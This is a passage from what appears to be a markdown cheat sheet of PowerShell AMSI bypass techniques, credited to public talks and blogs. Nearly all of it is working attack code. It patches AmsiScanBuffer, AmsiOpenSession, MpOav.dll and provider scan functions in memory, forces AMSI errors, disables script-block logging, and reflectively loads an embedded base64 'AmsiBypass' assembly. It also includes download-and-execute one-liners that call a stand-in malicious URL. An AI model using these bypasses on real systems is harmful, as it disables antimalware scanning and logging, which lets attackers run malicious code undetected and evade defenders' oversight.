        private static extern IntPtr GetCurrentProcess();
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
        private static readonly string CLASS = Methods.Transform("Tztufn/Nbobhfnfou/Bvupnbujpo/BntjVujmt");
        private static readonly string METHOD = Methods.Transform("TdboDpoufou");
    }
}
"@
Add-Type $code
[Editor.Methods]::Patch()

```

# Patch the providers DLL of Microsoft MpOav.dll #
- Source: [https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf](https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf), author: Maor Korkos (@maorkor)

## With Add-Type

```powershell

$APIs = @"
using System;
using System.Runtime.InteropServices;
public class APIs {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ekwiam, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $APIs

$wzys = "0xB8"
$coxo = "0x57"
$hxuu = "0x00"
$eqhh = "0x07"
$paej = "0x80"
$ppiy = "0xC3"
$Patch = [Byte[]] ($wzys,$coxo,$hxuu,$eqhh,+$paej,+$ppiy)

$LoadLibrary = [APIs]::LoadLibrary("MpOav.dll")
$Address = [APIs]::GetProcAddress($LoadLibrary,"DllGetClassObject")
$p = 0
[APIs]::VirtualProtect($Address, [uint32]6, 0x40, [ref]$p)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
$object = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls')
$Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
$Uninitialize.Invoke($object,$null) 

```

## Using reflection

```powershell
function Get-ProcAddress {
    Param(
        [Parameter(Position = 0, Mandatory = $True)] [String] $Module,
        [Parameter(Position = 1, Mandatory = $True)] [String] $Procedure
    )

    # Get a reference to System.dll in the GAC
    $SystemAssembly = [AppDomain]::CurrentDomain.GetAssemblies() |
    Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll') }
    $UnsafeNativeMethods = $SystemAssembly.GetType('Microsoft.Win32.UnsafeNativeMethods')
    # Get a reference to the GetModuleHandle and GetProcAddress methods
    $GetModuleHandle = $UnsafeNativeMethods.GetMethod('GetModuleHandle')
    $GetProcAddress = $UnsafeNativeMethods.GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef], [String]))
    # Get a handle to the module specified
    $Kern32Handle = $GetModuleHandle.Invoke($null, @($Module))
    $tmpPtr = New-Object IntPtr
    $HandleRef = New-Object System.Runtime.InteropServices.HandleRef($tmpPtr, $Kern32Handle)
    # Return the address of the function
    return $GetProcAddress.Invoke($null, @([System.Runtime.InteropServices.HandleRef]$HandleRef, $Procedure))
}
function Get-DelegateType
{
    Param
    (
        [OutputType([Type])]
            
        [Parameter( Position = 0)]
        [Type[]]
        $Parameters = (New-Object Type[](0)),
            
        [Parameter( Position = 1 )]
        [Type]
        $ReturnType = [Void]
    )

    $Domain = [AppDomain]::CurrentDomain
    $DynAssembly = New-Object System.Reflection.AssemblyName('ReflectedDelegate')
    $AssemblyBuilder = $Domain.DefineDynamicAssembly($DynAssembly, [System.Reflection.Emit.AssemblyBuilderAccess]::Run)
    $ModuleBuilder = $AssemblyBuilder.DefineDynamicModule('InMemoryModule', $false)
    $TypeBuilder = $ModuleBuilder.DefineType('MyDelegateType', 'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])
    $ConstructorBuilder = $TypeBuilder.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $Parameters)
    $ConstructorBuilder.SetImplementationFlags('Runtime, Managed')
    $MethodBuilder = $TypeBuilder.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $ReturnType, $Parameters)
    $MethodBuilder.SetImplementationFlags('Runtime, Managed')
        
    Write-Output $TypeBuilder.CreateType()
}
$LoadLibraryAddr = Get-ProcAddress kernel32.dll LoadLibraryA
$LoadLibraryDelegate = Get-DelegateType @([String]) ([IntPtr])
$LoadLibrary = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($LoadLibraryAddr,
$LoadLibraryDelegate)
$GetProcAddressAddr = Get-ProcAddress kernel32.dll GetProcAddress
$GetProcAddressDelegate = Get-DelegateType @([IntPtr], [String]) ([IntPtr])
$GetProcAddress = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($GetProcAddressAddr,
$GetProcAddressDelegate)
$VirtualProtectAddr = Get-ProcAddress kernel32.dll VirtualProtect
$VirtualProtectDelegate = Get-DelegateType @([IntPtr], [UIntPtr], [UInt32], [UInt32].MakeByRefType()) ([Bool])
$VirtualProtect = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualProtectAddr,
$VirtualProtectDelegate)

$hModule = $LoadLibrary.Invoke("MpOav.dll")
$DllGetClassObjectAddress = $GetProcAddress.Invoke($hModule,
"DllGetClassObject")
$p = 0
$VirtualProtect.Invoke($DllGetClassObjectAddress, [uint32]6, 0x40, [ref]$p) 
$ret_minus = [byte[]] (0xb8, 0xff, 0xff, 0xff, 0xff, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($ret_minus, 0, $DllGetClassObjectAddress, 6)
$object = [Ref].Assembly.GetType('System.Ma'+'nag'+'eme'+'nt.Autom'+'ation.A'+'ms'+'iU'+'ti'+'ls')
$Uninitialize = $object.GetMethods('N'+'onPu'+'blic,st'+'at'+'ic') | Where-Object Name -eq Uninitialize
$Uninitialize.Invoke($object,$null) 

```

# Scanning Interception

- Source: [https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf](https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf), author: Maor Korkos (@maorkor)

## 32 Bit (Powershell x86 only)
```powershell
Write-Host "AMSI providers' scan interception"
Write-Host "-- Maor Korkos (@maorkor)"
Write-Host "-- 32bit implemetation"

$APIs = @"
using System;
using System.Runtime.InteropServices;
public class APIs {
  [DllImport("kernel32")]
  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
  [DllImport("amsi")]
  public static extern int AmsiInitialize(string appName, out IntPtr context);
}
"@
Add-Type $APIs

# Declare varaibles
$SIZE_OF_PTR = 4
$ret_zero = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3)
$ctx = 0; $p = 0; $i = 0

# Calling AmsiInitialize to recieve a new AMS1 Context 
[APIs]::AmsiInitialize("MyAmsiScanner", [ref]$ctx)
Write-host "AMS1 context:" $ctx

# Find the AntiMalwareProviders list in CAmsiAntimalware
$CAmsiAntimalware = [System.Runtime.InteropServices.Marshal]::ReadInt32($ctx+8)
$AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt32($CAmsiAntimalware+36)

# Loop through all the providers
while ($AntimalwareProvider -ne 0)
{
  # Find the provider's Scan function
  $AntimalwareProviderVtbl =  [System.Runtime.InteropServices.Marshal]::ReadInt32($AntimalwareProvider)
  $AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt32($AntimalwareProviderVtbl + 12)
  
  # Patch the Scan function
  Write-host "[$i] Provider's scan function found!" $AmsiProviderScanFunc
  [APIs]::VirtualProtect($AmsiProviderScanFunc, [uint32]6, 0x40, [ref]$p)
  [System.Runtime.InteropServices.Marshal]::Copy($ret_zero, 0, $AmsiProviderScanFunc, 6)
  
  $i++
  $AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt32($CAmsiAntimalware+36 + ($i*$SIZE_OF_PTR))
}
```

## 64 Bit 

```
Write-Host "AMSI providers' scan interception"
Write-Host "-- Maor Korkos (@maorkor)"
Write-Host "-- 64bit implemetation"

$Apis = @"
using System;
using System.Runtime.InteropServices;
public class Apis {
  [DllImport("kernel32")]
  public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
  [DllImport("amsi")]
  public static extern int AmsiInitialize(string appName, out Int64 context);
}
"@
Add-Type $Apis

$ret_zero = [byte[]] (0xb8, 0x0, 0x00, 0x00, 0x00, 0xC3)
$p = 0; $i = 0
$SIZE_OF_PTR = 8
[Int64]$ctx = 0

[Apis]::AmsiInitialize("MyScanner", [ref]$ctx)
$CAmsiAntimalware = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$ctx, 16)
$AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64)

# Loop through all the providers
while ($AntimalwareProvider -ne 0)
{
  # Find the provider's Scan function
  $AntimalwareProviderVtbl =  [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProvider)
  $AmsiProviderScanFunc = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$AntimalwareProviderVtbl, 24)

  # Patch the Scan function
  Write-host "[$i] Provider's scan function found!" $AmsiProviderScanFunc
  [APIs]::VirtualProtect($AmsiProviderScanFunc, [uint32]6, 0x40, [ref]$p)
  [System.Runtime.InteropServices.Marshal]::Copy($ret_zero, 0, [IntPtr]$AmsiProviderScanFunc, 6)
  
  $i++
  $AntimalwareProvider = [System.Runtime.InteropServices.Marshal]::ReadInt64([IntPtr]$CAmsiAntimalware, 64 + ($i*$SIZE_OF_PTR))
}
```

# Patching AMSI AmsiScanBuffer by rasta-mouse #
```powershell
$Win32 = @"

using System;
using System.Runtime.InteropServices;

public class Win32 {

    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

}
"@

Add-Type $Win32

$LoadLibrary = [Win32]::LoadLibrary("am" + "si.dll")
$Address = [Win32]::GetProcAddress($LoadLibrary, "Amsi" + "Scan" + "Buffer")
$p = 0
[Win32]::VirtualProtect($Address, [uint32]5, 0x40, [ref]$p)
$Patch = [Byte[]] (0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3)
[System.Runtime.InteropServices.Marshal]::Copy($Patch, 0, $Address, 6)
```

# Dont use net webclient # - Not Working anymore, there was a patch for it

    $webreq = [System.Net.WebRequest]::Create(‘https://maliciousscripturl/malicious.ps1’)

    $resp=$webreq.GetResponse()

    $respstream=$resp.GetResponseStream()

    $reader=[System.IO.StreamReader]::new($respstream)

    $content=$reader.ReadToEnd()

    IEX($content)


# Patching AMSI AmsiOpenSession
```powershell
# Author: Matheus Alexandre, https://www.blazeinfosec.com/post/tearing-amsi-with-3-bytes/
function lookFuncAddr{
Param($moduleName, $functionName)

$assem = ([AppDomain]::CurrentDomain.GetAssemblies() |
Where-Object {$_.GlobalAssemblyCache -And $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods')
$tmp=@()
$assem.GetMethods() | ForEach-Object{If($_.Name -eq 'GetProcAddress') {$tmp+=$_}}
return $tmp[0].Invoke($null, @(($assem.GetMethod('GetModuleHandle')).Invoke($null, @($moduleName)), $functionName))
}

function getDelegateType{
Param(
[Parameter(Position = 0, Mandatory = $True)] [Type[]] $func,
[Parameter(Position = 1)] [Type] $delType = [Void]
)

$type = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName('ReflectedDelegate')),
[System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule('InMemoryModule', $false).DefineType('MyDelegateType',
'Class, Public, Sealed, AnsiClass, AutoClass', [System.MulticastDelegate])

$type.DefineConstructor('RTSpecialName, HideBySig, Public', [System.Reflection.CallingConventions]::Standard, $func).SetImplementationFlags('Runtime, Managed')
$type.DefineMethod('Invoke', 'Public, HideBySig, NewSlot, Virtual', $delType, $func).SetImplementationFlags('Runtime, Managed')

return $type.CreateType()
}

[IntPtr]$amsiAddr = lookFuncAddr amsi.dll AmsiOpenSession
$oldProtect = 0
$vp=[System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((lookFuncAddr kernel32.dll VirtualProtect),
(getDelegateType @([IntPtr], [UInt32], [UInt32], [UInt32].MakeByRefType()) ([Bool])))

$vp.Invoke($amsiAddr, 3, 0x40, [ref]$oldProtect)

$3b = [Byte[]] (0x48, 0x31, 0xC0)
[System.Runtime.InteropServices.Marshal]::Copy($3b, 0, $amsiAddr, 3)

$vp.Invoke($amsiAddr, 3, 0x20, [ref]$oldProtect)
```


# The Short version of dont use powershell net webclient - Not Working anymore, there was a patch for it
```
IEX([Net.Webclient]::new().DownloadString("https://maliciousscripturl/malicious.ps1"))
```
# Amsi ScanBuffer Patch

Egghunter with blog post: https://www.contextis.com/us/blog/amsi-bypass

```
Write-Host "-- AMSI Patch"
Write-Host "-- Paul Laîné (@am0nsec)"
Write-Host ""

$Kernel32 = @"
using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);

    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string lpLibFileName);

    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);
}
"@

Add-Type $Kernel32

Class Hunter {
    static [IntPtr] FindAddress([IntPtr]$address, [byte[]]$egg) {
        while ($true) {
            [int]$count = 0

            while ($true) {
                [IntPtr]$address = [IntPtr]::Add($address, 1)
                If ([System.Runtime.InteropServices.Marshal]::ReadByte($address) -eq $egg.Get($count)) {
                    $count++
                    If ($count -eq $egg.Length) {
                        return [IntPtr]::Subtract($address, $egg.Length - 1)
                    }
                } Else { break }
            }
        }

        return $address
    }
}

[IntPtr]$hModule = [Kernel32]::LoadLibrary("amsi.dll")
Write-Host "[+] AMSI DLL Handle: $hModule"

[IntPtr]$dllCanUnloadNowAddress = [Kernel32]::GetProcAddress($hModule, "DllCanUnloadNow")
Write-Host "[+] DllCanUnloadNow address: $dllCanUnloadNowAddress"

If ([IntPtr]::Size -eq 8) {
	Write-Host "[+] 64-bits process"
    [byte[]]$egg = [byte[]] (
        0x4C, 0x8B, 0xDC,       # mov     r11,rsp
        0x49, 0x89, 0x5B, 0x08, # mov     qword ptr [r11+8],rbx
        0x49, 0x89, 0x6B, 0x10, # mov     qword ptr [r11+10h],rbp
        0x49, 0x89, 0x73, 0x18, # mov     qword ptr [r11+18h],rsi
        0x57,                   # push    rdi
        0x41, 0x56,             # push    r14
        0x41, 0x57,             # push    r15
        0x48, 0x83, 0xEC, 0x70  # sub     rsp,70h
    )
} Else {
	Write-Host "[+] 32-bits process"
    [byte[]]$egg = [byte[]] (
        0x8B, 0xFF,             # mov     edi,edi
        0x55,                   # push    ebp
        0x8B, 0xEC,             # mov     ebp,esp
        0x83, 0xEC, 0x18,       # sub     esp,18h
        0x53,                   # push    ebx
        0x56                    # push    esi
    )
}
[IntPtr]$targetedAddress = [Hunter]::FindAddress($dllCanUnloadNowAddress, $egg)
Write-Host "[+] Targeted address: $targetedAddress"

$oldProtectionBuffer = 0
[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, 4, [ref]$oldProtectionBuffer) | Out-Null

$patch = [byte[]] (
    0x31, 0xC0,    # xor rax, rax
    0xC3           # ret  
)
[System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $targetedAddress, 3)

$a = 0
[Kernel32]::VirtualProtect($targetedAddress, [uint32]2, $oldProtectionBuffer, [ref]$a) | Out-Null

```
# Forcing an error #
```
$mem = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(9076)

[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiSession","NonPublic,Static").SetValue($null, $null);[Ref].Assembly.GetType("System.Management.Automation.AmsiUtils").GetField("amsiContext","NonPublic,Static").SetValue($null, [IntPtr]$mem)
```
# Disable Script Logging #
```
$settings = [Ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static").GetValue($null);
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"] = @{}
$settings["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"].Add("EnableScriptBlockLogging", "0")
```
```
[Ref].Assembly.GetType("System.Management.Automation.ScriptBlock").GetField("signatures","NonPublic,static").SetValue($null, (New-Object 'System.Collections.Generic.HashSet[string]'))
```

# Amsi Buffer Patch - In memory # 
```
function Bypass-AMSI
{
    if(-not ([System.Management.Automation.PSTypeName]"Bypass.AMSI").Type) {     [Reflection.Assembly]::Load([Convert]::FromBase64String("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YXJkAERpc2FibGUAUnVudGltZUZpZWxkSGFuZGxlAENvbnNvbGUAaE1vZHVsZQBwcm9jTmFtZQBuYW1lAFdyaXRlTGluZQBWYWx1ZVR5cGUAQ29tcGlsZXJHZW5lcmF0ZWRBdHRyaWJ1dGUARGVidWdnYWJsZUF0dHJpYnV0ZQBBc3NlbWJseVRpdGxlQXR0cmlidXRlAFRhcmdldEZyYW1ld29ya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5SW5mb3JtYXRpb25hbFZlcnNpb25BdHRyaWJ1dGUAQXNzZW1ibHlDb25maWd1cmF0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBCeXRlAGR3U2l6ZQBzaXplAFN5c3RlbS5SdW50aW1lLlZlcnNpb25pbmcAQWxsb2NIR2xvYmFsAE1hcnNoYWwAS2VybmVsMzIuZGxsAEFtc2lCeXBhc3MuZGxsAFN5c3RlbQBTeXN0ZW0uUmVmbGVjdGlvbgBvcF9BZGRpdGlvbgBaZXJvAC5jdG9yAFVJbnRQdHIAU3lzdGVtLkRpYWdub3N0aWNzAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBTeXN0ZW0uUnVudGltZS5Db21waWxlclNlcnZpY2VzAERlYnVnZ2luZ01vZGVzAFJ1bnRpbWVIZWxwZXJzAEFtc2lCeXBhc3MAR2V0UHJvY0FkZHJlc3MAbHBBZGRyZXNzAE9iamVjdABscGZsT2xkUHJvdGVjdABWaXJ0dWFsUHJvdGVjdABmbE5ld1Byb3RlY3QAb3BfRXhwbGljaXQAZGVzdABJbml0aWFsaXplQXJyYXkAQ29weQBMb2FkTGlicmFyeQBSdGxNb3ZlTWVtb3J5AG9wX0VxdWFsaXR5AAARYQBtAHMAaQAuAGQAbABsAABXRQBSAFIATwBSADoAIABDAG8AdQBsAGQAIABuAG8AdAAgAHIAZQB0AHIAaQBlAHYAZQAgAGEAbQBzAGkALgBkAGwAbAAgAHAAbwBpAG4AdABlAHIALgAAHUEAbQBzAGkAUwBjAGEAbgBCAHUAZgBmAGUAcgAAc0UAUgBSAE8AUgA6ACAAQwBvAHUAbABkACAAbgBvAHQAIAByAGUAdAByAGkAZQB2AGUAIABBAG0AcwBpAFMAYwBhAG4AQgB1AGYAZgBlAHIAIABmAHUAbgBjAHQAaQBvAG4AIABwAG8AaQBuAHQAZQByAAB1RQBSAFIATwBSADoAIABDAG8AdQBsAGQAIABuAG8AdAAgAGMAaABhAG4AZwBlACAAQQBtAHMAaQBTAGMAYQBuAEIAdQBmAGYAZQByACAAbQBlAG0AbwByAHkAIABwAGUAcgBtAGkAcwBzAGkAbwBuAHMAIQAAU0cAcgBlAGEAdAAgAHMAdQBjAGMAZQBzAHMALgAgAEEAbQBzAGkAUwBjAGEAbgBCAHUAZgBmAGUAcgAgAHAAYQB0AGMAaABlAGQAIQAgADoAKQAAALj1zdc1kW1DrpRSfqgqDIUABCABAQgDIAABBSABARERBCABAQ4NBwoYGBkJHQUYAggCAgIGGAUAAgIYGAQAAQEOBAABGQsHAAIBElERVQQAARgICAAEAR0FCBgIBQACGBgICMx7E//NLd1RAwYREAUAAhgYDgQAARgOCAAEAhgZCRAJBgADARgYCAMAAAgIAQAIAAAAAAAeAQABAFQCFldyYXBOb25FeGNlcHRpb25UaHJvd3MBCAEABwEAAAAANgEAGS5ORVRTdGFuZGFyZCxWZXJzaW9uPXYyLjABAFQOFEZyYW1ld29ya0Rpc3BsYXlOYW1lAA8BAApBbXNpQnlwYXNzAAAKAQAFRGVidWcAAAwBAAcxLjAuMC4wAAAKAQAFMS4wLjAAAAQBAAAAAAAAAAAAOsRk5QABTVACAAAAZAAAAHwrAAB8DQAAAAAAAAAAAAABAAAAEwAAACcAAADgKwAA4A0AAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAABSU0RTjA86n5+khUmILRfMmrpC/wEAAAAvb3B0L1Byb2plY3RzL0Ftc2lCeXBhc3MvQW1zaUJ5cGFzcy9vYmovRGVidWcvbmV0c3RhbmRhcmQyLjAvQW1zaUJ5cGFzcy5wZGIAU0hBMjU2AIwPOp+fpIWJyC0XzJq6Qv86xGTlbSfIKidw8ohPKRL4LywAAAAAAAAAAAAASSwAAAAgAAAAAAAAAAAAAAAAAAAAAAAAAAAAADssAAAAAAAAAAAAAAAAX0NvckRsbE1haW4AbXNjb3JlZS5kbGwAAAAAAAD/JQAgABAx/5AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAQAAAAGAAAgAAAAAAAAAAAAAAAAAAAAQABAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAAAAAASAAAAFhAAADUAgAAAAAAAAAAAADUAjQAAABWAFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAEAAAAAAAAAAQAAAAAAPwAAAAAAAAAEAAAAAgAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAENAIAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAAEAIAAAEAMAAwADAAMAAwADQAYgAwAAAANgALAAEAQwBvAG0AcABhAG4AeQBOAGEAbQBlAAAAAABBAG0AcwBpAEIAeQBwAGEAcwBzAAAAAAA+AAsAAQBGAGkAbABlAEQAZQBzAGMAcgBpAHAAdABpAG8AbgAAAAAAQQBtAHMAaQBCAHkAcABhAHMAcwAAAAAAMAAIAAEARgBpAGwAZQBWAGUAcgBzAGkAbwBuAAAAAAAxAC4AMAAuADAALgAwAAAAPgAPAAEASQBuAHQAZQByAG4AYQBsAE4AYQBtAGUAAABBAG0AcwBpAEIAeQBwAGEAcwBzAC4AZABsAGwAAAAAACgAAgABAEwAZQBnAGEAbABDAG8AcAB5AHIAaQBnAGgAdAAAACAAAABGAA8AAQBPAHIAaQBnAGkAbgBhAGwARgBpAGwAZQBuAGEAbQBlAAAAQQBtAHMAaQBCAHkAcABhAHMAcwAuAGQAbABsAAAAAAA2AAsAAQBQAHIAbwBkAHUAYwB0AE4AYQBtAGUAAAAAAEEAbQBzAGkAQgB5AHAAYQBzAHMAAAAAADAABgABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADEALgAwAC4AMAAAADgACAABAEEAcwBzAGUAbQBiAGwAeQAgAFYAZQByAHMAaQBvAG4AAAAxAC4AMAAuADAAL